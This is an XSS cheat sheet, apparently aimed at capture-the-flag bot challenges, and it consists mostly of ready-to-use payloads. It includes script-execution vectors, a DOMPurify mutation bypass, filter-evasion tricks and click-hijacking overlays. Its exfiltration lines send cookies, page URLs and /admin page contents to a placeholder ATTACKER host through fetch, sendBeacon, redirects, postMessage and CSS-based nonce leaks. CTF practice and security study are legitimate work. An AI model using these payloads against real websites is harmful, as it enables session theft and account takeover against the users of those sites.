# XSS

## The Basics

1. Solve locally with the same browser family if possible.
2. If `fetch` is blocked, try `navigator.sendBeacon`, `XMLHttpRequest`, image, form, or redirect.
3. For bot challenges, first identify where the flag lives: cookie, URL, localStorage, admin page, or internal endpoint.
4. `SameSite=Lax` cookies need top-level navigation. Try `window.open`.
5. Keep the final bot payload short and reliable.

## Javascript

```javascript
//This is a 1 line comment
/* This is a multiline comment*/
#!This is a 1 line comment, but "#!" must be at the beginning of the line
-->This is a 1 line comment, but "-->" must be at the beginning of the line
```

## Pop Alert

```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="<svg onload=alert(1)>"></iframe>
<a href="javascript:alert(1)">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data="data:text/html,<script>alert(5)</script>">
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>
```

## Bot Exfil

```html
<img src=x onerror="fetch('https://ATTACKER/?c='+document.cookie)">
<img src=x onerror="navigator.sendBeacon('https://ATTACKER/',document.cookie)">
<script>location='https://ATTACKER/?c='+encodeURIComponent(document.cookie)</script>
<script>fetch('/admin').then(r=>r.text()).then(x=>fetch('https://ATTACKER/',{method:'POST',body:x}))</script>
```

## Bot URL Flag

Use when the bot appends the flag to the visited URL.

```js
fetch("https://ATTACKER/?u=" + encodeURIComponent(location.href))
fetch("https://ATTACKER/?q=" + encodeURIComponent(location.search))
```

Leak via Referer when script is blocked but images/preload work:

```html
<img src="https://ATTACKER/seed.png">
```

Attacker response:

```http
Link: <https://ATTACKER/leak.png>; rel=preload; as=image; referrerpolicy=unsafe-url
```

## DOMPurify

```html
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
```

## Parentheses Filtered

```html
<svg onload=alert`1`>
<img src=x onerror=eval.call`${'alert\x281\x29'}`>
<iframe srcdoc="<script>top['al'+'ert']`1`</script>">
```

## DOM Sources / Sinks

```text
Sources: location, location.hash, location.search, document.URL, document.referrer, window.name, postMessage
Sinks: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout, Function, location=
Search: innerHTML|insertAdjacentHTML|document.write|eval|postMessage|location.hash|window.name
```

## postMessage To Browser Bot

Use [Browser Security](browser-security.md) for the full postMessage/opener/CORS playbook.

Things to check:

```js
window.addEventListener("message", (event) => {
  // bad if no event.origin allowlist
  // bad if hidden action reaches eval / Function / AsyncFunction / fetch / DOM sinks
});
```

If a bot cookie is `SameSite=Lax`, embedding the target in an attacker iframe may not expose `document.cookie`. Open the vulnerable page as a top-level popup instead, then send `postMessage` to the popup. Top-level navigation makes Lax cookies available.

```js
popup.postMessage({type:"debug", code:"fetch('/admin').then(r=>r.text()).then(t=>fetch('https://ATTACKER/',{method:'POST',body:t}))"}, "*")
```

## Mutation XSS

[https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss ](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)

## XS Leak (CSS Injection)

usually to leak nonce

[https://waituck.sg/2023/12/11/0ctf-2023-newdiary-writeup.html](https://waituck.sg/2023/12/11/0ctf-2023-newdiary-writeup.html)

```css
input[name="nonce"][value^="a"] { background:
url("HOOK?data=a");display: block !important; }


```

## CSS And Events

```html
<div oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
aaaa
</div>

<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

# Payload that injects an invisible overlay that triggers if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
# Moving your mouse anywhere over the page:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>

```

## CSP Bypass

* [HackTricks CSP bypass](https://hacktricks.boitatech.com.br/pentesting-web/content-security-policy-csp-bypass)

## Resources

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* [https://tinyxss.terjanq.me/](https://tinyxss.terjanq.me/)
* [https://hacktricks.boitatech.com.br/pentesting-web/xss-cross-site-scripting](https://hacktricks.boitatech.com.br/pentesting-web/xss-cross-site-scripting)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)
* [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
*   [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
